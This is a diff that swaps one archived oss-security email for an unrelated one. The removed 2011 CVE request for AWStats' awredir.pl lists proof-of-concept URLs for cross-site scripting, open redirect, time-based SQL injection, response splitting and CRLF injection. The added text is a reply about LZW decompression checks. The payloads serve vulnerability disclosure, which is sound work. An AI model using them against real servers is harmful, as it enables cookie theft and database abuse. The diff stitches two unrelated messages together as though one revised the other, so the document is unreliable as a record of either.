@@ -1,55 +1,30 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/10/07/1
-Message-ID: <4E8EB58B.4090704@redhat.com>
-Date: Fri, 07 Oct 2011 10:17:15 +0200
-From: Jan Lieskovsky <jlieskov@...hat.com>
-To: "Steven M. Christey" <coley@...us.mitre.org>
-CC: oss-security@...ts.openwall.com, MustLive <mustlive@...security.com.ua>
-Subject: CVE Request -- Multiple security issues in various versions of AWStats
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2011/09/29/2
+Message-ID: <20110929004153.GB13305@openwall.com>
+Date: Thu, 29 Sep 2011 04:41:53 +0400
+From: Solar Designer <solar@...nwall.com>
+To: Tomas Hoger <thoger@...hat.com>
+Cc: oss-security@...ts.openwall.com, Colin Percival <cperciva@...ebsd.org>
+Subject: Re: LZW decompression issues
 Content-Type: text/plain; charset=utf-8
 
-Hello Josh, Steve, vendors,
+Tomas -
 
-   these doesn't look like CVE ids have been already assigned for:
-   [1] https://bugzilla.redhat.com/show_bug.cgi?id=740926#c0
-   [2] http://secunia.com/advisories/46160/
-   [3] http://seclists.org/fulldisclosure/2011/Sep/234
-   [4] http://websecurity.com.ua/5380/
+On Wed, Sep 28, 2011 at 08:22:28PM +0200, Tomas Hoger wrote:
+> Let me try to explain some.
 
-If I counted correctly, six CVE ids should be assigned for these
-(since different versions are listed as vulnerable):
+Thank you!  This is very helpful.
 
-1) XSS (WASC-08) (in versions <=1.1):
-    http://site/awredir.pl?url=javascript:alert(document.cookie)
+> > Do we possibly want to add the "maxbits < 12" check as well?  And does
+> > it matter for security?
+> 
+> I'm not aware of any security impact of that.  Not sure if there's any
+> spec that requires maxbits >= 12, if not, INIT_BITS (9) may be a safer
+> lower bound.
 
-2) Redirector (URL Redirector Abuse in WASC 2.0) (WASC-38):
-    http://site/awredir.pl?url=http://websecurity.com.ua
+I am asking Joerg about it in another message.
 
-3) SQL Injection (WASC-19): (version 1.2)
-    http://site/awredir.pl?url='%20and%20benchmark(10000,md5(now()))/*
+Colin - thank you for your prompt response (redirecting us to NetBSD).
+Some further postings went without CC to you, I hope that's OK.
 
-4) XSS (WASC-08) (in version 1.2):
-
-    http://site/awredir.pl?url=%3Cscript%3Ealert(document.cookie)%3C
-    /script%3E
-
-    http://site/awredir.pl?key=%3Cscript%3Ealert(document.cookie)%3C
-    /script%3E
-
-5) HTTP Response Splitting (WASC-25):
-
-    http://site/awredir.pl?key=04ed5362e853c72ca275818a7c0c5857&
-    url=%0AHeader:1
-
-6) CRLF Injection (Improper Input Handling in WASC 2.0) (WASC-20):
-
-    http://site/awredir.pl?key=4b9faa91e2529400c4f3c70833b4e4a5&
-    url=%0AText
-
-Could you allocate CVE identifiers for these? (let me know
-if further description of each of the issues is necessary prior
-assignment).
-
-Thank you && Regards, Jan.
---
-Jan iankko Lieskovsky / Red Hat Security Response Team
+Alexander
